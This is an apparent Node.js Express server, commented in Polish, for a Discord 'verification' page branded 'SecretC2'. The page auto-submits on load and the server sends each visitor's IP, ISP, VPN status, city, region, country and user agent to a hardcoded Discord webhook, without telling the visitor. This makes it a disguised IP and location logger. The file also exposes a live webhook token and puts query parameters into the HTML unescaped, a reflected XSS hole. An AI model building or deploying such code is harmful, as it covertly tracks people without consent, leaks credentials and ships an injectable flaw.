const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

// Przechowywanie kodów (prosta mapa)
const validCodes = new Map();

// Funkcja do info o IP
async function getIPInfo(ip) {
  try {
    if (ip === '::1' || ip === '127.0.0.1') ip = '8.8.8.8';
    
    const response = await axios.get(`http://ip-api.com/json/${ip}?fields=66846719`);
    const data = response.data;
    
    if (data.status === 'success') {
      return {
        ip: data.query,
        isp: data.isp || 'Nieznane',
        vpn: data.proxy || data.hosting ? 'Tak' : 'Nie',
        country: data.country || 'Nieznane',
        region: data.regionName || 'Nieznane',
        city: data.city || 'Nieznane',
        type: data.mobile ? 'Mobile' : (data.hosting ? 'Hosting' : 'Biznes/Dom')
      };
    }
  } catch (error) {
    console.error('Błąd pobierania info o IP:', error.message);
  }
  
  return {
    ip: ip,
    isp: 'Nieznane',
    vpn: 'Nieznane',
    country: 'Nieznane',
    region: 'Nieznane',
    city: 'Nieznane',
    type: 'Nieznane'
  };
}

// Endpoint do rejestracji kodu (wywoływany przez bota)
app.post('/api/register-code', (req, res) => {
  const { code, userId } = req.body;
  
  if (!code || !userId) {
    return res.status(400).json({ error: 'Brak danych' });
  }
  
  // Kod ważny 15 minut
  validCodes.set(code, {
    userId: userId,
    expires: Date.now() + 15 * 60 * 1000
  });
  
  // Czyść stare kody
  for (let [key, value] of validCodes.entries()) {
    if (value.expires < Date.now()) {
      validCodes.delete(key);
    }
  }
  
  console.log(`✅ Kod ${code} zarejestrowany dla ${userId}`);
  res.json({ success: true });
});

// Strona weryfikacji
app.get('/', (req, res) => {
  const { code, userId } = req.query;
  
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Weryfikacja - SecretC2</title>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
          min-height: 100vh;
          display: flex;
          align-items: center;
          justify-content: center;
        }
        .container {
          background: white;
          border-radius: 20px;
          box-shadow: 0 20px 60px rgba(0,0,0,0.3);
          padding: 40px;
          max-width: 400px;
          width: 90%;
        }
        h1 {
          color: #333;
          margin-bottom: 20px;
          text-align: center;
          font-size: 28px;
        }
        .code-display {
          background: #f0f0f0;
          border-radius: 10px;
          padding: 20px;
          text-align: center;
          font-size: 32px;
          font-weight: bold;
          letter-spacing: 5px;
          margin-bottom: 20px;
          color: #667eea;
        }
        .form-group {
          margin-bottom: 20px;
        }
        label {
          display: block;
          margin-bottom: 5px;
          color: #666;
          font-weight: 500;
        }
        input {
          width: 100%;
          padding: 12px;
          border: 2px solid #e0e0e0;
          border-radius: 8px;
          font-size: 16px;
          transition: border-color 0.3s;
        }
        input:focus {
          outline: none;
          border-color: #667eea;
        }
        button {
          width: 100%;
          padding: 14px;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          color: white;
          border: none;
          border-radius: 8px;
          font-size: 18px;
          font-weight: 600;
          cursor: pointer;
          transition: transform 0.2s;
        }
        button:hover {
          transform: translateY(-2px);
        }
        .message {
          margin-top: 20px;
          padding: 10px;
          border-radius: 8px;
          text-align: center;
          display: none;
        }
        .message.success {
          background: #d4edda;
          color: #155724;
          display: block;
        }
        .message.error {
          background: #f8d7da;
          color: #721c24;
          display: block;
        }
        .info {
          margin-top: 20px;
          font-size: 14px;
          color: #999;
          text-align: center;
        }
        .hidden {
          display: none;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <h1>🔐 Weryfikacja - SecretC2</h1>
        <div class="code-display" id="codeDisplay">${code || 'Wpisz kod'}</div>
        
        <div class="form-group">
          <label for="code">Kod weryfikacyjny</label>
          <input type="text" id="code" placeholder="Wpisz kod" value="${code || ''}">
        </div>
        
        <!-- Ukryte pole z ID użytkownika -->
        <input type="hidden" id="userId" value="${userId || ''}">
        
        <button onclick="verify()">Zweryfikuj</button>
        
        <div id="message" class="message"></div>
        <div class="info">SecretC2 - System weryfikacji</div>
      </div>

      <script>
        async function verify() {
          const code = document.getElementById('code').value;
          const userId = document.getElementById('userId').value;
          const messageDiv = document.getElementById('message');
          
          if(!code) {
            messageDiv.className = 'message error';
            messageDiv.textContent = 'Wpisz kod weryfikacyjny!';
            return;
          }
          
          if(!userId) {
            messageDiv.className = 'message error';
            messageDiv.textContent = 'Brak ID użytkownika - wróć na Discorda i kliknij przycisk ponownie!';
            return;
          }
          
          try {
            const response = await fetch('/api/verify', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ code, userId })
            });
            
            const data = await response.json();
            
            if(data.success) {
              messageDiv.className = 'message success';
              messageDiv.textContent = '✅ Zweryfikowano pomyślnie! Możesz wrócić na Discorda.';
            } else {
              messageDiv.className = 'message error';
              messageDiv.textContent = '❌ ' + (data.message || 'Błąd weryfikacji');
            }
          } catch(error) {
            messageDiv.className = 'message error';
            messageDiv.textContent = '❌ Błąd połączenia z serwerem';
          }
        }
        
        window.onload = function() {
          const urlParams = new URLSearchParams(window.location.search);
          const code = urlParams.get('code');
          const userId = urlParams.get('userId');
          
          if(code) {
            document.getElementById('code').value = code;
          }
          if(userId) {
            document.getElementById('userId').value = userId;
          }
          
          // Auto-weryfikacja jeśli mamy i kod i userId
          if(code && userId) {
            setTimeout(verify, 500);
          }
        }
      </script>
    </body>
    </html>
  `);
});

// API endpoint do weryfikacji
app.post('/api/verify', async (req, res) => {
  const { code, userId } = req.body;
  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  
  console.log(`🔍 Próba weryfikacji: code=${code}, userId=${userId}, ip=${clientIp}`);
  
  if (!code || !userId) {
    return res.json({ success: false, message: 'Brak kodu lub userId' });
  }
  
  // Sprawdź czy kod istnieje i jest ważny
  const stored = validCodes.get(code);
  if (!stored) {
    console.log(`❌ Kod ${code} nie istnieje`);
    return res.json({ success: false, message: 'Nieprawidłowy kod!' });
  }
  
  if (stored.userId !== userId) {
    console.log(`❌ Kod ${code} należy do innego użytkownika (${stored.userId} != ${userId})`);
    return res.json({ success: false, message: 'Kod nie pasuje do tego użytkownika!' });
  }
  
  if (stored.expires < Date.now()) {
    console.log(`❌ Kod ${code} wygasł`);
    validCodes.delete(code);
    return res.json({ success: false, message: 'Kod wygasł!' });
  }
  
  // Usuń kod (jednorazowy)
  validCodes.delete(code);
  console.log(`✅ Kod ${code} zweryfikowany pomyślnie dla ${userId}`);
  
  // Pobierz info o IP
  const ipInfo = await getIPInfo(clientIp);
  
  // === WAŻNE: Wyślij informację do bota przez webhook ===
  try {
    // Webhook, który bot nasłuchuje (ten sam co w VERIFY_LOG_CHANNEL_ID)
    await axios.post('https://discord.com/api/webhooks/1482626978367537205/VC5fSNon0vk09yTW1vjnWHTw1-D1S5kaC9YmYeswvZaiT5BRCv42T01NLWqN_kQWNS1z', {
      content: JSON.stringify({
        type: 'verification',
        success: true,
        userId: userId,
        ipInfo: ipInfo
      })
    });
    console.log(`📤 Wysłano webhook do bota dla ${userId}`);
  } catch (error) {
    console.error('❌ Błąd wysyłania webhooka do bota:', error.message);
  }
  
  // Wyślij też ładny embed na kanał logów
  try {
    await axios.post('https://discord.com/api/webhooks/1482626978367537205/VC5fSNon0vk09yTW1vjnWHTw1-D1S5kaC9YmYeswvZaiT5BRCv42T01NLWqN_kQWNS1z', {
      embeds: [{
        title: '✅ Nowa weryfikacja',
        color: 0x00ff00,
        fields: [
          { name: 'Użytkownik', value: `<@${userId}> (${userId})`, inline: false },
          { name: '📡 NETWORK INFORMATION', value: 
            `**IP:** ${ipInfo.ip}\n` +
            `**ISP:** ${ipInfo.isp}\n` +
            `**VPN:** ${ipInfo.vpn}`, inline: false
          },
          { name: '📍 LOCATION', value:
            `**Kraj:** ${ipInfo.country}\n` +
            `**Region:** ${ipInfo.region}\n` +
            `**Miasto:** ${ipInfo.city}`, inline: false
          },
          { name: '💻 DEVICE INFORMATION', value:
            `**Urządzenie:** ${req.headers['user-agent']?.substring(0, 50) || 'Nieznane'}\n` +
            `**Provider:** ${ipInfo.isp}\n` +
            `**Typ:** ${ipInfo.type}`, inline: false
          }
        ],
        timestamp: new Date().toISOString(),
        footer: { text: 'SecretC2 - System weryfikacji' }
      }]
    });
  } catch(e) {
    console.error('Błąd webhooka embed:', e.message);
  }
  
  res.json({ 
    success: true, 
    message: 'Zweryfikowano pomyślnie!'
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Serwer weryfikacji działa na porcie ${PORT}`);
});
